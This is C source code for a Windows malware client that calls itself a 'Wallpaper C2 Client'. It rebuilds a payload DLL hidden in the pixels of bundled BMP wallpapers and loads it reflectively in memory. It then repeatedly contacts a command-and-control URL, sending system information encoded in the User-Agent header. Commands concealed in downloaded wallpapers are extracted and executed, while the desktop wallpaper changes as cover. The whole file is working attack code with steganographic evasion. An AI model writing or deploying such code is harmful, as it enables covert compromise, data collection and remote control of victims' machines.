// mal.c - Main executable that loads payload DLL from embedded images
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <windows.h>
#include <io.h>
#include <wininet.h>
#include <time.h>

// Configuration
#define IMAGE_PREFIX "default"
#define IMAGE_EXT ".bmp"
#define DELAY_MS 5000
#define HTTP_URL "http://IP:PORT/wallpaper"
#define TEMP_WALLPAPER "temp_wallpaper.bmp"

// Metadata structure (must match DLL)
typedef struct {
    uint32_t target_index1;
    uint32_t target_index2;
    uint32_t offset;
    uint32_t size;
} MetadataResult;

// Function pointer types for DLL exports
typedef char* (*WallpaperSlider_t)(void);
typedef MetadataResult* (*WallpaperCache_t)(const char*);
typedef int (*ServerDefault_t)(const char*, uint32_t);
typedef BOOL (*ServerBackward_t)(const char*);

// Global DLL function pointers
static WallpaperSlider_t     pfnWallpaperSlider = NULL;
static WallpaperCache_t    pfnWallpaperCache = NULL;
static ServerDefault_t        pfnServerDefault = NULL;
static ServerBackward_t       pfnServerBackward = NULL;

// Global state
static BOOL g_metadata_active = FALSE;
static uint32_t g_metadata_counter = 0;

#pragma pack(push, 1)
typedef struct {
    uint16_t type;
    uint32_t size;
    uint16_t reserved1;
    uint16_t reserved2;
    uint32_t offset;
} BMPHeader;

typedef struct {
    uint32_t size;
    int32_t  width;
    int32_t  height;
    uint16_t planes;
    uint16_t bits_per_pixel;
    uint32_t compression;
    uint32_t image_size;
    int32_t  x_pixels_per_meter;
    int32_t  y_pixels_per_meter;
    uint32_t colors_used;
    uint32_t important_colors;
} BMPInfoHeader;
#pragma pack(pop)

// ============================================================
// BMP pixel loading for DLL extraction
// =============================================================
uint8_t* load_bmp_pixels(const char* filepath, size_t* pixel_count) {
    FILE* file = fopen(filepath, "rb");
    if (!file) {
        return NULL;
    }
    
    BMPHeader header;
    BMPInfoHeader info;
    
    fread(&header, sizeof(BMPHeader), 1, file);
    fread(&info, sizeof(BMPInfoHeader), 1, file);
    
    if (header.type != 0x4D42) {
        printf("[-] Invalid BMP: %s\n", filepath);
        fclose(file);
        return NULL;
    }
    
    if (info.bits_per_pixel != 24) {
        printf("[-] Unsupported BMP format: %d bpp (need 24)\n", info.bits_per_pixel);
        fclose(file);
        return NULL;
    }
    
    int width = info.width;
    int height = abs(info.height);
    int row_size = ((width * 3 + 3) / 4) * 4;
    
    *pixel_count = width * height;
    uint8_t* pixels = (uint8_t*)malloc(*pixel_count * 3);
    if (!pixels) {
        fclose(file);
        return NULL;
    }
    
    fseek(file, header.offset, SEEK_SET);
    
    uint8_t* row_buffer = (uint8_t*)malloc(row_size);
    for (int y = height - 1; y >= 0; y--) {
        fread(row_buffer, 1, row_size, file);
        for (int x = 0; x < width; x++) {
            int src_idx = x * 3;
            int dst_idx = (y * width + x) * 3;
            pixels[dst_idx + 0] = row_buffer[src_idx + 2]; // R
            pixels[dst_idx + 1] = row_buffer[src_idx + 1]; // G
            pixels[dst_idx + 2] = row_buffer[src_idx + 0]; // B
        }
    }
    
    free(row_buffer);
    fclose(file);
    return pixels;
}

// ============================================================
// Reflective DLL loader
// ============================================================
typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);

HMODULE load_dll_from_memory(uint8_t* dll_data, size_t dll_size) {
    
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)dll_data;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)(dll_data + dos_header->e_lfanew);
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }
    
    size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    uint8_t* image_base = (uint8_t*)VirtualAlloc(
        (LPVOID)nt_headers->OptionalHeader.ImageBase,
        image_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!image_base) {
        image_base = (uint8_t*)VirtualAlloc(NULL, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }
    
    if (!image_base) {
        return NULL;
    }
        
    // Copy headers
    memcpy(image_base, dll_data, nt_headers->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt_headers);
    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section++) {
        if (section->SizeOfRawData > 0) {
            memcpy(image_base + section->VirtualAddress, dll_data + section->PointerToRawData, section->SizeOfRawData);
        }
    }
    
    // Process relocations
    ptrdiff_t delta = (ptrdiff_t)(image_base - nt_headers->OptionalHeader.ImageBase);
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY* reloc_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir->Size > 0) {
            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(image_base + reloc_dir->VirtualAddress);
            
            while (reloc->VirtualAddress > 0) {
                uint8_t* dest = image_base + reloc->VirtualAddress;
                WORD* reloc_item = (WORD*)((uint8_t*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                DWORD num_entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                
                for (DWORD j = 0; j < num_entries; j++) {
                    int type = reloc_item[j] >> 12;
                    int offset = reloc_item[j] & 0xFFF;
                    
                    if (type == IMAGE_REL_BASED_HIGHLOW) {
                        *(DWORD*)(dest + offset) += (DWORD)delta;
                    }
                    #ifdef _WIN64
                    else if (type == IMAGE_REL_BASED_DIR64) {
                        *(ULONGLONG*)(dest + offset) += delta;
                    }
                    #endif
                }
                reloc = (IMAGE_BASE_RELOCATION*)((uint8_t*)reloc + reloc->SizeOfBlock);
            }
        }
    }
    
    // Resolve imports
    IMAGE_DATA_DIRECTORY* import_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR* import_desc = (IMAGE_IMPORT_DESCRIPTOR*)(image_base + import_dir->VirtualAddress);
        
        while (import_desc->Name) {
            char* module_name = (char*)(image_base + import_desc->Name);
            HMODULE module = LoadLibraryA(module_name);
            
            if (!module) {
                VirtualFree(image_base, 0, MEM_RELEASE);
                return NULL;
            }
            
            IMAGE_THUNK_DATA* orig_thunk = (IMAGE_THUNK_DATA*)(image_base + import_desc->OriginalFirstThunk);
            IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)(image_base + import_desc->FirstThunk);
            
            while (orig_thunk->u1.AddressOfData) {
                FARPROC func_addr;
                if (IMAGE_SNAP_BY_ORDINAL(orig_thunk->u1.Ordinal)) {
                    func_addr = GetProcAddress(module, (LPCSTR)IMAGE_ORDINAL(orig_thunk->u1.Ordinal));
                } else {
                    IMAGE_IMPORT_BY_NAME* import_by_name = (IMAGE_IMPORT_BY_NAME*)(image_base + orig_thunk->u1.AddressOfData);
                    func_addr = GetProcAddress(module, import_by_name->Name);
                }
                
                if (!func_addr) {
                    VirtualFree(image_base, 0, MEM_RELEASE);
                    return NULL;
                }
                
                thunk->u1.Function = (ULONGLONG)func_addr;
                orig_thunk++;
                thunk++;
            }
            import_desc++;
        }
    }
    
    // Call DllMain
    DllMain_t dll_main = (DllMain_t)(image_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
    if (!dll_main((HINSTANCE)image_base, DLL_PROCESS_ATTACH, NULL)) {
        VirtualFree(image_base, 0, MEM_RELEASE);
        return NULL;
    }
    
    return (HMODULE)image_base;
}

// Custom GetProcAddress for memory-loaded DLL
FARPROC get_proc_from_memory_dll(HMODULE hModule, const char* procName) {
    uint8_t* base = (uint8_t*)hModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    
    IMAGE_DATA_DIRECTORY* export_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (export_dir->Size == 0) return NULL;
    
    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)(base + export_dir->VirtualAddress);
    
    DWORD* names = (DWORD*)(base + exports->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exports->AddressOfFunctions);
    
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)(base + names[i]);
        if (strcmp(name, procName) == 0) {
            WORD ordinal = ordinals[i];
            return (FARPROC)(base + functions[ordinal]);
        }
    }
    
    return NULL;
}

// ============================================================
// Extract and load DLL from default images
// ============================================================
HMODULE extract_and_load_dll() {    
    size_t count1, count2, count3;
    uint8_t* pixels1 = load_bmp_pixels("Defaults/default7.bmp", &count1);
    uint8_t* pixels2 = load_bmp_pixels("Defaults/default8.bmp", &count2);
    uint8_t* pixels3 = load_bmp_pixels("Defaults/default10.bmp", &count3);
    
    if (!pixels1 || !pixels2 || !pixels3) {
        if (pixels1) free(pixels1);
        if (pixels2) free(pixels2);
        if (pixels3) free(pixels3);
        return NULL;
    }
    
    size_t min_len = count1;
    if (count2 < min_len) min_len = count2;
    if (count3 < min_len) min_len = count3;
    
    // XOR streams: Red from img1, Blue from img2, Green from img3
    uint8_t* recovered = (uint8_t*)malloc(min_len);
    for (size_t i = 0; i < min_len; i++) {
        recovered[i] = pixels1[i * 3 + 0] ^ pixels2[i * 3 + 2] ^ pixels3[i * 3 + 1];
    }
        
    free(pixels1);
    free(pixels2);
    free(pixels3);
    
    // Find 0xDEADBEEF delimiters
    uint8_t delimiter[] = {0xDE, 0xAD, 0xBE, 0xEF};
    size_t start_idx = 0, end_idx = 0;
    BOOL found_start = FALSE;
    
    for (size_t i = 0; i <= min_len - 4; i++) {
        if (memcmp(&recovered[i], delimiter, 4) == 0) {
            if (!found_start) {
                start_idx = i + 4;
                found_start = TRUE;
            } else {
                end_idx = i;
                break;
            }
        }
    }
    
    HMODULE hDll = NULL;
    if (found_start && end_idx > start_idx) {
        size_t dll_size = end_idx - start_idx;
        hDll = load_dll_from_memory(&recovered[start_idx], dll_size);
    }
    free(recovered);
    return hDll;
}

// ============================================================
// HTTP download with custom User-Agent
// ============================================================
BOOL download_wallpaper(const char* user_agent) {
    HINTERNET hInternet = InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, HTTP_URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    
    FILE* file = fopen(TEMP_WALLPAPER, "wb");
    if (!file) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    
    BYTE buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fwrite(buffer, 1, bytesRead, file);
    }
    
    fclose(file);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return TRUE;
}

// ============================================================
// Set wallpaper
// ============================================================
void set_wallpaper(const char* path) {
    char absolutePath[MAX_PATH];
    _fullpath(absolutePath, path, MAX_PATH);
    
    if (SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)absolutePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
        printf("[+] Wallpaper set: %s\n", path);
    } else {
        printf("[-] Failed to set wallpaper\n");
    }
}

// ============================================================
// Get random default wallpaper
// ============================================================
char* get_random_default() {
    static char path[MAX_PATH];
    srand((unsigned int)time(NULL));
    
    for (int i = 0; i < 10; i++) {
        sprintf(path, "Defaults/%s%d%s", IMAGE_PREFIX, (rand() % 10) + 1, IMAGE_EXT);
        if (_access(path, 0) == 0) return path;
    }
    
    sprintf(path, "Defaults/%s1%s", IMAGE_PREFIX, IMAGE_EXT);
    return (_access(path, 0) == 0) ? path : NULL;
}

// ============================================================
// Main
// ============================================================
int main() {
    printf("===========================================\n");
    printf("      Wallpaper C2 Client v1.0\n");
    printf("===========================================\n");
    printf("Server: %s\n\n", HTTP_URL);
    
    // Step 1: Extract and load DLL from embedded images
    HMODULE hPayload = extract_and_load_dll();
    if (!hPayload) {
        return 1;
    }
    
    // Step 2: Get function pointers
    pfnWallpaperSlider = (WallpaperSlider_t)get_proc_from_memory_dll(hPayload, "WallpaperSlider");
    pfnWallpaperCache = (WallpaperCache_t)get_proc_from_memory_dll(hPayload, "WallpaperCache");
    pfnServerDefault = (ServerDefault_t)get_proc_from_memory_dll(hPayload, "ServerDefault");
    pfnServerBackward = (ServerBackward_t)get_proc_from_memory_dll(hPayload, "ServerBackward");
    
    if (!pfnWallpaperSlider || !pfnWallpaperCache || !pfnServerDefault || !pfnServerBackward) {
        printf("[-] FATAL: Could not resolve DLL exports\n");
        return 1;
    }
    
    printf("[+] All DLL functions loaded\n\n");
    
    // Main loop
    while (1) {
        char* wallpaper_path = NULL;
        BOOL server_success = FALSE;
        
        // Step 3: Get system info as base64-encoded User-Agent (already encoded by DLL)
        char* user_agent = pfnWallpaperSlider();
        
        if (!user_agent) {
            user_agent = _strdup("WallpaperCycler/1.0");
        }
                
        // Step 4: Download wallpaper with encoded User-Agent
        if (download_wallpaper(user_agent)) {
            wallpaper_path = TEMP_WALLPAPER;
            server_success = TRUE;
            
            printf("[+] Downloaded from server\n");
            
            // Step 5: Scan for metadata using DLL function
            MetadataResult* metadata = pfnWallpaperCache(wallpaper_path);
            
            if (metadata) {
                g_metadata_active = TRUE;
                g_metadata_counter = 1;  // Start counter when metadata is found
                free(metadata);
            }
            
            // Step 6: If metadata active, try to extract streams
            if (g_metadata_active) {
                int result = pfnServerDefault(wallpaper_path, g_metadata_counter);
                
                // Increment counter for next image
                g_metadata_counter++;
                
                // Step 7: If both streams ready, decode and execute
                if (result == 3) {
                    BOOL exec_result = pfnServerBackward(NULL);
                    g_metadata_active = FALSE;
                    g_metadata_counter = 0;  // Reset counter when work is done
                }
            }
        } else {
            printf("[-] Server unreachable, using default\n");
            wallpaper_path = get_random_default();
        }
        
        free(user_agent);
        
        // Step 8: Set wallpaper
        if (wallpaper_path) {
            set_wallpaper(wallpaper_path);
        }
        
        // Cleanup temp file
        if (server_success) {
            Sleep(1000);
            DeleteFileA(TEMP_WALLPAPER);
        }
        
        Sleep(DELAY_MS);
    }
    
    return 0;
}